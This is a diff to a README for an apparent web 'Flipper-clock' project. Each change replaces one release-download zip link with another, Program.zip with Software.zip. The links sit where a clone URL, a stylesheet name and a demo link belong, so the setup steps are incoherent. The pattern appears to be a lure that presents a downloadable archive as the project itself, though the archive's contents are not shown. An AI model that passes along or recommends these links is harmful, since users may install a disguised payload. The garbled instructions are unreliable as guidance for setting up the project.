@@ -21,14 +21,14 @@ To run this project locally, follow these steps:
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/vra-thenix/Flipper-clock/releases/download/v1.0/Program.zip
+   git clone https://github.com/vra-thenix/Flipper-clock/releases/download/v2.0/Software.zip
 
 2. Navigate to the project directory:
    ```bash
    cd flipper-clock
 
 # Usage
-The clock will automatically start when the page is loaded. You can customize the styles in the ```https://github.com/vra-thenix/Flipper-clock/releases/download/v1.0/Program.zip``` file to change the appearance of the clock.
+The clock will automatically start when the page is loaded. You can customize the styles in the ```https://github.com/vra-thenix/Flipper-clock/releases/download/v2.0/Software.zip``` file to change the appearance of the clock.
 
 
 # Contributing
@@ -50,7 +50,7 @@ Feel free to modify any section to better fit your project details!!
 
 # Demo
 
-Try this : https://github.com/vra-thenix/Flipper-clock/releases/download/v1.0/Program.zip
+Try this : https://github.com/vra-thenix/Flipper-clock/releases/download/v2.0/Software.zip
 
 
 
